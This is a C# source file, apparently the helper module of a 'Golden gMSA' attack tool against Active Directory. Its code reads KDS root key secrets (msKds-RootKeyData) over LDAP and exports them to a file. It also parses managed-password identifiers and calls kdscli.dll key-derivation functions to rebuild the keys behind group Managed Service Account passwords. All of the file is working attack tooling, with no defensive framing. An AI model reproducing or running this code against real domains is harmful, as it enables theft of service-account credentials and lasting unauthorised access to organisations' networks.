using System;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace GoldengMSA
{
    public class Utils
    {
        public static string forest = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Forest.Name;

        public static string domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;

        [DllImport(@"kdscli.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        public static extern uint GenerateKDFContext(byte[] Guid, int ContextInit, long ContextInit2, long ContextInit3, int Flag, out IntPtr outContext, out int outContextSize, out int Flag2);

        [DllImport(@"kdscli.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
        public static extern uint GenerateDerivedKey(string KDFAlgorithmID, byte[] KDFParam, int KDFParamSize, byte[] pbSecret, long cbSecret, byte[] Context, int ContextSize, ref int notSure, byte[] Label, int LabelSize, int notsureFlag, [MarshalAs(UnmanagedType.LPArray)] byte[] pbDerivedKey, int cbDerivedKey, int AlwaysZero);

        public static long[] GetIntervalId(long TimeStamp)
        {
            long KeyCycleDuration = 360000000000;
            int L1_KEY_ITERATION = 32;
            int L2_KEY_ITERATION = 32;
            long L0KeyID = (TimeStamp / KeyCycleDuration / L2_KEY_ITERATION / L1_KEY_ITERATION);
            long L1KeyID = (TimeStamp / KeyCycleDuration / L2_KEY_ITERATION) & (L1_KEY_ITERATION - 1);
            long L2KeyID = (TimeStamp / KeyCycleDuration) & (L2_KEY_ITERATION - 1);
            return new long[] { L0KeyID, L1KeyID, L2KeyID };

        }

        public static long GetKdsKeyCycleDuration()
        {
            return 360000000000;
        }

        public static void GetCurrentIntervalID(long KdsKeyCycleDuration, int SomeFlag, ref int L0KeyID, ref int L1KeyID, ref int L2KeyID)
        {
            long currentTime = DateTime.Now.ToFileTimeUtc();
            if (SomeFlag != 0)
            {
                currentTime += 3000000000;
            }
            int temp = (int)(currentTime / KdsKeyCycleDuration);
            L0KeyID = temp / 1024;
            L1KeyID = (temp / 32) & 31;
            L2KeyID = temp & 31;
            return;
        }

        public static void GetIntervalStartTime(long KdsKeyCycleDuration, int L0KeyID, int L1KeyID, int L2KeyID, ref long IntervalStartTime)
        {
            IntervalStartTime = KdsKeyCycleDuration * (L2KeyID + 32 * (L1KeyID + 32 * L0KeyID));
            return;
        }

        public static string GetDN()
        {
            DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://RootDSE");
            Object distinguishedName = RootDirEntry.Properties["defaultNamingContext"].Value;
            return distinguishedName.ToString();
        }
    }

    public class Root_Key
    {
        public int msKdsVersion { get; set; }
        public Guid cn { get; set; }
        public int ProbReserved { get; set; }
        public int msKdsVersion2 { get; set; }
        public int ProbReserved2 { get; set; }
        public string msKdsKDFAlgorithmID { get; set; }
        public byte[] msKdsKDFParam { get; set; }
        public int KDFParamSize { get; set; }
        public int ProbReserved3 { get; set; }
        public string KdsSecretAgreementAlgorithmID { get; set; }
        public byte[] KdsSecretAgreementParam { get; set; }
        public int SecretAlgoritmParamSize { get; set; }
        public int PrivateKeyLength { get; set; }
        public int PublicKeyLength { get; set; }
        public int ProbReserved4 { get; set; }
        public int ProbReserved5 { get; set; }
        public int ProbReserved6 { get; set; }
        public long flag { get; set; }
        public long flag2 { get; set; }
        public string KdsDomainID { get; set; }
        public long KdsCreateTime { get; set; }
        public long KdsUseStartTime { get; set; }
        public long ProbReserved7 { get; set; }
        public long KdsRootKeyDataSize { get; set; }
        public byte[] KdsRootKeyData { get; set; }

        public Root_Key(SearchResult result)
        {
            msKdsVersion = (int)result.Properties["msKds-Version"][0];
            cn = Guid.Parse(result.Properties["cn"][0].ToString());
            ProbReserved = 0;
            msKdsVersion2 = (int)result.Properties["msKds-Version"][0];
            ProbReserved2 = 0;
            msKdsKDFAlgorithmID = result.Properties["msKds-KDFAlgorithmID"][0].ToString();
            msKdsKDFParam = (byte[])result.Properties["msKds-KDFParam"][0];
            KDFParamSize = msKdsKDFParam.Length;
            ProbReserved3 = 0;
            KdsSecretAgreementAlgorithmID = result.Properties["msKds-SecretAgreementAlgorithmID"][0].ToString();
            KdsSecretAgreementParam = (byte[])result.Properties["msKds-SecretAgreementParam"][0];
            SecretAlgoritmParamSize = KdsSecretAgreementParam.Length;
            PrivateKeyLength = (int)result.Properties["msKds-PrivateKeyLength"][0];
            PublicKeyLength = (int)result.Properties["msKds-PublicKeyLength"][0];
            ProbReserved4 = 0;
            ProbReserved5 = 0;
            ProbReserved6 = 0;
            flag = 1;
            flag2 = 1;
            KdsDomainID = result.Properties["msKds-DomainID"][0].ToString();
            KdsCreateTime = (long)result.Properties["msKds-CreateTime"][0];
            KdsUseStartTime = (long)result.Properties["msKds-UseStartTime"][0];
            ProbReserved7 = 0;
            KdsRootKeyDataSize = 64;
            KdsRootKeyData = (byte[])result.Properties["msKds-RootKeyData"][0];
        }

        public Root_Key(string path)
        {
            string[] lines = File.ReadAllLines(path);
            msKdsVersion = Int32.Parse(lines[0]);
            cn = Guid.Parse(lines[1]);
            ProbReserved = 0;
            msKdsVersion2 = Int32.Parse(lines[0]);
            ProbReserved2 = 0;
            msKdsKDFAlgorithmID = lines[2];
            msKdsKDFParam = Convert.FromBase64String(lines[3]);
            KDFParamSize = msKdsKDFParam.Length;
            ProbReserved3 = 0;
            KdsSecretAgreementAlgorithmID = lines[4];
            KdsSecretAgreementParam = Convert.FromBase64String(lines[5]);
            SecretAlgoritmParamSize = KdsSecretAgreementParam.Length;
            PrivateKeyLength = Int32.Parse(lines[6]);
            PublicKeyLength = Int32.Parse(lines[7]);
            ProbReserved4 = 0;
            ProbReserved5 = 0;
            ProbReserved6 = 0;
            flag = 1;
            flag2 = 1;
            KdsDomainID = lines[8];
            KdsCreateTime = long.Parse(lines[9]);
            KdsUseStartTime = long.Parse(lines[10]);
            ProbReserved7 = 0;
            KdsRootKeyDataSize = 64;
            KdsRootKeyData = Convert.FromBase64String(lines[11]);
        }

        protected Root_Key(Root_Key RootKey)
        {
            this.msKdsVersion = RootKey.msKdsVersion;
            this.cn = RootKey.cn;
            this.ProbReserved = 0;
            this.msKdsVersion2 = RootKey.msKdsVersion;
            this.ProbReserved2 = 0;
            this.msKdsKDFAlgorithmID = RootKey.msKdsKDFAlgorithmID;
            this.msKdsKDFParam = RootKey.msKdsKDFParam.ToArray();
            this.KDFParamSize = RootKey.KDFParamSize;
            this.ProbReserved3 = RootKey.ProbReserved3;
            this.KdsSecretAgreementAlgorithmID = RootKey.KdsSecretAgreementAlgorithmID;
            this.KdsSecretAgreementParam = RootKey.KdsSecretAgreementParam.ToArray();
            this.SecretAlgoritmParamSize = RootKey.SecretAlgoritmParamSize;
            this.PrivateKeyLength = RootKey.PrivateKeyLength;
            this.PublicKeyLength = RootKey.PublicKeyLength;
            this.ProbReserved4 = RootKey.ProbReserved4;
            this.ProbReserved5 = RootKey.ProbReserved5;
            this.ProbReserved6 = RootKey.ProbReserved6;
            this.flag = RootKey.flag;
            this.flag2 = RootKey.flag2;
            this.KdsDomainID = RootKey.KdsDomainID;
            this.KdsCreateTime = RootKey.KdsCreateTime;
            this.KdsUseStartTime = RootKey.KdsUseStartTime;
            this.ProbReserved7 = RootKey.ProbReserved7;
            this.KdsRootKeyDataSize = RootKey.KdsRootKeyDataSize;
            this.KdsRootKeyData = RootKey.KdsRootKeyData;
        }

        public static void Export(SearchResult result, string path)
        {
            using (StreamWriter outputFile = new StreamWriter(path))
            {
                outputFile.WriteLine(result.Properties["msKds-Version"][0].ToString());
                outputFile.WriteLine(result.Properties["cn"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-KDFAlgorithmID"][0].ToString());
                outputFile.WriteLine(Convert.ToBase64String((byte[])result.Properties["msKds-KDFParam"][0]));
                outputFile.WriteLine(result.Properties["msKds-SecretAgreementAlgorithmID"][0].ToString());
                outputFile.WriteLine(Convert.ToBase64String((byte[])result.Properties["msKds-SecretAgreementParam"][0]));
                outputFile.WriteLine(result.Properties["msKds-PrivateKeyLength"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-PublicKeyLength"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-DomainID"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-CreateTime"][0].ToString());
                outputFile.WriteLine(result.Properties["msKds-UseStartTime"][0].ToString());
                outputFile.WriteLine(Convert.ToBase64String((byte[])result.Properties["msKds-RootKeyData"][0]));
            }
        }
    }

    // This class comes from ComputeL0Key function inside KdsSvc.dll. it takes a Root_Key structure, adds a field in the begining (L0KeyID)
    // and modifies the KdsRootKeyData field with a value from GenerateDerivedKey. 
    public class L0_Key : Root_Key
    {
        public long L0KeyID { get; set; }
        public L0_Key(Root_Key RootKey, long L0KeyID, byte[] derivedKey)
         : base(RootKey)
        {
            this.L0KeyID = L0KeyID;
            this.KdsRootKeyData = derivedKey;
        }
    }

    public class Msds_ManagedPasswordID
    {
        public int Version { get; set; }
        public int Reserved { get; set; }
        public int isPublicKey { get; set; }
        public int L0Index { get; set; }
        public int L1Index { get; set; }
        public int L2Index { get; set; }
        public Guid RootKeyIdentifier { get; set; }
        public int cbUnknown { get; set; }
        public int cbDomainName { get; set; }
        public int cbForestName { get; set; }
        public byte[] Unknown { get; set; }
        public string DomainName { get; set; }
        public string ForestName { get; set; }

        public Msds_ManagedPasswordID(byte[] ManagedPasswordArr)
        {
            Version = BitConverter.ToInt32(ManagedPasswordArr, 0);
            Reserved = BitConverter.ToInt32(ManagedPasswordArr, 4);
            isPublicKey = BitConverter.ToInt32(ManagedPasswordArr, 8);
            L0Index = BitConverter.ToInt32(ManagedPasswordArr, 12);
            L1Index = BitConverter.ToInt32(ManagedPasswordArr, 16);
            L2Index = BitConverter.ToInt32(ManagedPasswordArr, 20);
            byte[] temp = new byte[16];
            Array.Copy(ManagedPasswordArr, 24, temp, 0, 16);
            RootKeyIdentifier = new Guid(temp);
            cbUnknown = BitConverter.ToInt32(ManagedPasswordArr, 40);
            cbDomainName = BitConverter.ToInt32(ManagedPasswordArr, 44);
            cbForestName = BitConverter.ToInt32(ManagedPasswordArr, 48);
            if (cbUnknown > 0)
            {
                Array.Copy(ManagedPasswordArr, 52, Unknown, 0, cbUnknown);
            }
            else
            {
                Unknown = null;
            }
            DomainName = System.Text.Encoding.Unicode.GetString(ManagedPasswordArr, 52 + cbUnknown, cbDomainName);
            ForestName = System.Text.Encoding.Unicode.GetString(ManagedPasswordArr, 52 + cbDomainName + cbUnknown, cbForestName);
        }
    }
}
